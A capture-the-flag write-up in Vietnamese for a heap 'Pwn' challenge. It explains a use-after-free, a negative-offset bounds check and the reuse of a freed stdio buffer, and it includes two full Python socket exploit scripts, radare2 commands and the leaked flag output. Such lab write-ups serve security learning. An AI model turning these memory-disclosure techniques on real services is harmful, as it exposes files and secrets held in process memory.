---
title: "House of Water"
category: "Pwn"
tags: ["use-after-free", "negative-offset", "stdio-buffer-reuse", "heap", "libc-leak-free"]
solve_date: "2026-10-09"
language: "vi"
---

# House of Water

**Flag:** `OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}`
**Dịch vụ:** `145.239.142.129:1341`. **Artifact:** `house-of-water.zip` (1072535 B), chứa `chal` (17032 B), `libc.so.6` (2220400 B), `ld-linux-x86-64.so.2` (236616 B). Tác giả đề: Om Khanjodkar.

## Đề bài

Menu heap (Hard, 500 điểm): `1) malloc`, `2) free`, `3) edit`, `4) show`, `5) exit`. Chương trình mở `./flag.txt` và đọc nội dung file này trong `setup()` trước khi vào menu. Mục tiêu là lấy lại chuỗi cờ từ bộ nhớ của tiến trình dịch vụ.

## Phân tích

`readelf -h` trả `Type: DYN`, `r2 -q -c "iI~pic" chal` trả `pic true`; `readelf -dW` có `FLAGS BIND_NOW` cùng `GNU_RELRO` (full RELRO), `GNU_STACK` chỉ `RW` (NX), binary tham chiếu `__stack_chk_fail`. `chal` không stripped, tên hàm (`do_malloc`, `do_free`, `do_edit`, `do_show`, `check_bounds`, `setup`) giữ nguyên trong symtab.

`setup()` (`0x130f`) setvbuf cho `stdout`/`stdin`, `malloc(0x80)` + `memset` làm buffer nhận, rồi `fopen("./flag.txt", "r")` và đọc bằng `fgets`, kết thúc bằng `fclose`. Ba chi tiết quyết định:

1. `do_free` (`0x16a8`) gọi `free(chunks[idx])`, đặt `freed[idx] = 1` (`0x16e8`) nhưng **không** ghi `NULL` vào `chunks[]` (`.bss` tại `0x4040`) → mọi slot đã release vẫn `show`/`edit` được: use-after-free.
2. `check_bounds` (`0x1509`) tính biên dưới theo trạng thái slot:

   ```text
   0x00001545  lea rdx, obj.freed          ; 0x4440
   0x0000154c  movzx eax, byte [rax + rdx]
   0x00001550  test al, al
   0x00001552  je 0x155d
   0x00001554  mov rax, 0xfffffffffffffff0
   0x0000155b  jmp 0x1562
   0x0000155d  mov eax, 0
   ```

   `max = freed[idx] ? -16 : 0`, và phép thử `offset >= max` (`0x156a`) nên slot đã release cho phép offset âm tới `-16`, đủ để chạm header chunk. Biên trên là `offset + length <= sizes[idx]` (`0x1587..0x15ad`), `length` phải trong `(0, 0x400]`.
3. Buffer stdio được cấp với request `0x1000`, tương ứng chunk size `0x1010` trên glibc x86-64. Chunk này vượt trần tcache `0x410`. Sau khi giải phóng, phần thân có thể còn dữ liệu file; các trường metadata của allocator có thể ghi đè đầu chunk.

Lời giải dùng việc allocator cấp lại buffer stdio đã được giải phóng. Chuỗi này không cần UAF, offset âm hay tcache poisoning.

## Lời giải

Xin đúng kích thước buffer stdio để heap trả lại chính chunk đó:

1. `malloc(slot 0, 0x1000)` — sau khi `setup()` đã `fclose` FILE, request `0x1000` khớp với chunk buffer đang nằm trong bin; `_int_malloc` cắt/dùng chunk và **không** viết đè phần thân, nên user data vẫn giữ nguyên nội dung `./flag.txt`.
2. `show(slot 0, offset 0, length 0x64)` — `do_show` in từng byte dưới dạng `%02x`; `check_bounds` chấp nhận vì slot chưa từng được `free` nên `max = 0`.

Một lần `show` đủ đọc chuỗi cờ dài 37 byte từ buffer được cấp lại. Các lần đọc đã ghi nhận:

```text
### slot0 +0x0 len=1024
0000 4f 57 41 53 50 7b 64 72 69 6e 6b 5f 66 72 30 6d  OWASP{drink_fr0m
...
0020 34 63 68 33 7d 0a
```

(dòng ở offset `0x10` nằm giữa hai dòng được ghi lại; nó chứa `_th3_p0is0n3d_tc`.) và phép đọc 0x40 byte của script giải cuối:

```text
[2] raw: b'OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}\n\x00…'
```

(các byte NUL nối tiếp được viết tắt trong log.)

Cross-check: cùng layout nhưng request `malloc(0x80)` cũng trả về vùng nhớ này; khi đó 16 byte đầu mang metadata của bin (`fd`/`key`) nên chỉ đọc được phần đuôi `_th3_p0is0n3d_tc4ch3}` từ offset `0x10`. Nội dung từ `0x10` trở đi trùng từng byte với phép đọc `0x1000`, xác nhận chuỗi cờ là một dải liền mạch trong buffer stdio đã giải phóng chứ không phải sản phẩm của cửa sổ đọc.

## Kết quả

```text
OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}
```

Cờ đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.

## Tái hiện

Cần Python 3 (`socket`, `struct`, `re`) và dịch vụ ở `145.239.142.129:1341`; hai block dưới đây là script đầy đủ, lưu lần lượt thành `final.py` và `sweep.py` rồi chạy `python final.py` (cấp slot 0 size `0x1000`, in 0x40 byte đọc được và cờ) hoặc `python sweep.py` (in hexdump `0x400` byte tại offset 0, `0x400`, `0x800`, `0xc00`). Toàn bộ lời giải chỉ gồm `malloc(0, 0x1000)` rồi `show(0, 0, 0x64)`; không cần chạy local bằng `ld-linux-x86-64.so.2`/`libc.so.6` đi kèm.

```python
import socket, re
s=socket.create_connection(("145.239.142.129",1341),timeout=20)
def rd(w=0.6):
    s.settimeout(w); b=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            b+=c
    except socket.timeout: pass
    return b
rd()
def menu(n):
    s.sendall(str(n).encode()+b'\n'); return rd()
def mk(i,sz):
    menu(1); s.sendall(b'%d\n'%i); rd(); s.sendall(b'%d\n'%sz); return rd()
def sh(i,o,l):
    menu(4); s.sendall(b'%d\n'%i); rd(); s.sendall(b'%d\n'%o); rd(); s.sendall(b'%d\n'%l); return rd()
def parse(b):
    out=b''
    for t in b.replace(b'\n',b' ').split():
        try: out+=bytes([int(t,16)])
        except ValueError: pass
    return out
print("[1]", rd_ := mk(0,0x1000))     # pop freed stdio buffer chunk (holds full flag.txt line)
d=parse(sh(0,0,0x40))
print("[2] raw:", d)
print("[3] flag:", re.search(rb'OWASP\{[^}]*\}', d).group().decode())
menu(5); s.close()
```

```python
import socket, struct, sys
H,P="145.239.142.129",1341
s=socket.create_connection((H,P),timeout=20); 
def rd(w=0.7):
    s.settimeout(w); b=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            b+=c
    except socket.timeout: pass
    return b
rd()
def menu(n):
    s.sendall(str(n).encode()+b'\n'); return rd()
def mk(i,sz):
    menu(1); s.sendall(b'%d\n'%i); rd(); s.sendall(b'%d\n'%sz); return rd()
def sh(i,o,l):
    menu(4); s.sendall(b'%d\n'%i); rd(); s.sendall(b'%d\n'%o); rd(); s.sendall(b'%d\n'%l); return rd()
def parse(b):
    out=b''
    for tok in b.replace(b'\n',b' ').split():
        try: out+=bytes([int(tok,16)])
        except ValueError: pass
    return out
def dump(label,b):
    d=parse(b)
    print("###",label,"len=%d"%len(d))
    for i in range(0,len(d),16):
        row=d[i:i+16]
        print("%04x  %-47s  %s"%(i," ".join("%02x"%c for c in row),"".join(chr(c) if 32<=c<127 else '.' for c in row)))
# 0x1000 chunk (candidate: old FILE read buffer)
dump("slot0 0x1000", sh0) if False else None
mk(0,0x1000)
for off in (0,0x400,0x800,0xc00):
    dump("slot0 +0x%x"%off, sh(0,off,0x400))
s.close()
```

Kiểm tra tĩnh:

```console
$ r2 -q -c "iI~pic" chal
$ r2 -q -c "aa; pd 30 @ 0x1509" chal
$ r2 -q -c "aa; pdf @ sym.do_free" chal
$ r2 -q -c "aa; pdf @ sym.setup" chal
```

`0x1554` (hằng số `-16`), `0x16e8` (`freed[idx] = 1`) và `.bss` tại `0x4040`/`0x4240`/`0x4440` đọc từ artifact `chal`; `0x410` là trần size của tcache trong glibc 2.35 đi kèm.
